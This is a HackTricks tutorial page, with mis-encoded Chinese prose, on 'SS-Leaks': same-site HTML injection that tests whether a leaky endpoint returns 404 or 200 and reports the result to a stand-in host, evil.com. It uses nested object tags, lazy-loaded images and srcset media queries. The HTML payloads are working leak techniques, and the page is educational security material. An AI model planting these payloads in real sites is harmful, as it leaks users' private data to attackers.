# SS-Leaks

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œå‚åŠ </strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>è¯¾ç¨‹ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸Šçœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

è¿™æ˜¯**æ‚¬æŒ‚æ ‡è®°å’ŒXS-Leaks**ä¹‹é—´çš„**æ··åˆ**ã€‚ä¸€æ–¹é¢ï¼Œæ¼æ´å…è®¸åœ¨ä¸æˆ‘ä»¬å°†è¦æ”»å‡»çš„é¡µé¢**åŒæº**çš„é¡µé¢ä¸­**æ³¨å…¥HTML**ï¼ˆä½†ä¸æ˜¯JSï¼‰ã€‚å¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¸ä¼šç›´æ¥**æ”»å‡»**æˆ‘ä»¬å¯ä»¥æ³¨å…¥HTMLçš„é¡µé¢ï¼Œè€Œæ˜¯**å¦ä¸€ä¸ªé¡µé¢**ã€‚

## åµŒå¥—å¯¹è±¡

å¦‚æœ<mark style="color:yellow;">`/api/v1/leaky?secret=a`</mark>ç«¯ç‚¹è¿”å›404çŠ¶æ€ç ï¼Œåˆ™å†…éƒ¨`object`ä¼šè¢«åŠ è½½ï¼Œç»™<mark style="color:yellow;">`https://evil.com?callback=a`</mark>ä¸€ä¸ªå›è°ƒï¼Œå¹¶è®©æˆ‘ä»¬çŸ¥é“æœç´¢æŸ¥è¯¢`a`æ²¡æœ‰ç»“æœã€‚
```html
<object data="/api/v1/leaky?secret=a">
<object data="https://evil.com?callback=a"></object>
</object>
```
### æ‡’åŠ è½½

å¦‚æœCSPé˜»æ­¢äº†å¤–éƒ¨å¯¹è±¡æ€ä¹ˆåŠï¼Ÿè®©æˆ‘ä»¬å†è¯•ä¸€æ¬¡ä»¥ä¸‹çš„CSPï¼š

<mark style="color:yellow;">`Content-Security-Policy: default-src 'self'; img-src *;`</mark>

æˆ‘ä»¬ä¸Šé¢çš„å›è°ƒ`object`ä¸å†èµ·ä½œç”¨ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å›¾ç‰‡[æ‡’åŠ è½½](https://developer.mozilla.org/en-US/docs/Web/Performance/Lazy_loading)æ¥æ›¿ä»£ï¼ä»¥ä¸‹å›¾ç‰‡åªä¼šåœ¨å…¶å¯è§ä¸”è·ç¦»è§†å£ä¸€å®šè·ç¦»å†…æ—¶åŠ è½½ã€‚
```html
<object data="/api/v1/leaky?secret=a">
<img src="https://evil.com?callback" loading="lazy">
</object>
```
### å“åº”å¼å›¾ç‰‡

ä¸Šè¿°æŠ€æœ¯éå¸¸æœ‰æ•ˆï¼Œä½†å®ƒä¾èµ–äºæˆ‘ä»¬çš„HTMLæ³¨å…¥ä½äºç”¨æˆ·çš„è§†å£å†…ã€‚

å¦‚æœæ³¨å…¥åœ¨å±å¹•ä¹‹å¤–ï¼Œç”¨æˆ·æ²¡æœ‰æ»šåŠ¨ï¼Œæˆ‘ä»¬è¿˜èƒ½æ³„éœ²æ•°æ®å—ï¼Ÿå½“ç„¶å¯ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…ƒç´ IDå’Œ[scroll-to-text-fragment](https://chromestatus.com/feature/4733392803332096)æ¥åˆ›å»ºä¸€ä¸ªå¼ºåˆ¶æ»šåŠ¨çš„URLï¼Œä½†è¿™äº›ä¾èµ–äºç”¨æˆ·äº’åŠ¨ï¼Œå¹¶ä¸”ä¸å…è®¸æˆ‘ä»¬åœ¨ç°å®ä¸–ç•Œåœºæ™¯ä¸­å®ç°ä¸€è‡´çš„æ³„éœ²ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›ä»¥å¯é çš„æ–¹å¼æ­¦å™¨åŒ–å­˜å‚¨çš„HTMLæ³¨å…¥ã€‚

å¼•å…¥å“åº”å¼å›¾ç‰‡ï¼å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯å›¾ç‰‡çš„`srcset`å’Œ`sizes`å±æ€§ã€‚

{% code overflow="wrap" %}
```html
<object data="/api/v1/leaky?secret=a">
<iframe srcdoc="<img srcset='https://evil.com?callback=1 480w, https://evil.com?callback=0 800w' sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'>" width="1000px">
</object>
```
{% endcode %}

è¿™é‡Œæœ‰å¾ˆå¤šå†…å®¹éœ€è¦è§£é‡Šã€‚é¦–å…ˆï¼Œè®°ä½å†…éƒ¨iframeåªæœ‰åœ¨æ³„éœ²ç«¯ç‚¹è¿”å›404çŠ¶æ€ç æ—¶æ‰ä¼šå¯è§ã€‚

è¿™å¾ˆé‡è¦ï¼Œå› ä¸ºæˆ‘ä»¬ç°åœ¨å°†æœ‰æ¡ä»¶åœ°ä»ä¸¤ä¸ªä¸åŒçš„URLåœ¨iframeä¸­åŠ è½½å›¾ç‰‡ã€‚ä½¿ç”¨`sizes`å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨[åª’ä½“æŸ¥è¯¢](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries/Using_media_queries)æ ¹æ®è§†å£å¤§å°é€‰æ‹©ä»å“ªä¸ªURLåŠ è½½å›¾ç‰‡ã€‚

{% code overflow="wrap" %}
```html
<img
srcset='https://evil.com?callback=0 800w, https://evil.com?callback=1 480w'
sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'
>
```
{% endcode %}

å› ä¸ºæˆ‘ä»¬çš„iframeè®¾ç½®äº†`width="1000px"`ï¼Œä»¥ä¸‹æƒ…å†µä¼šå‘ç”Ÿï¼š

1. å¦‚æœleaky endpointè¿”å›404çŠ¶æ€ç ï¼Œiframeä¼šè¢«æ˜¾ç¤ºå¹¶ä¸”å®½åº¦ä¸º1000pxã€‚iframeå†…çš„å›¾ç‰‡ç¬¦åˆ`(min-width: 1000px)`åª’ä½“æŸ¥è¯¢ï¼Œå¹¶ä»`https://evil.com?callback=0`åŠ è½½800pxçš„å›¾ç‰‡ã€‚
2. å¦‚æœleaky endpointè¿”å›200çŠ¶æ€ç ï¼Œiframeå°†_ä¸ä¼š_æ˜¾ç¤ºã€‚ç”±äºå›¾ç‰‡ä¸æ˜¯ä½œä¸ºå¤§å‹iframeçš„ä¸€éƒ¨åˆ†æ¸²æŸ“çš„ï¼Œå®ƒç¬¦åˆ`(max-width 999px)`åª’ä½“æŸ¥è¯¢ï¼Œå¹¶ä»`https://evil.com?callback=1`åŠ è½½480pxçš„å›¾ç‰‡ã€‚

## å‚è€ƒèµ„æ–™

* [https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWS hackingï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricks**ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)ç³»åˆ—
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„hackingæŠ€å·§ã€‚

</details>
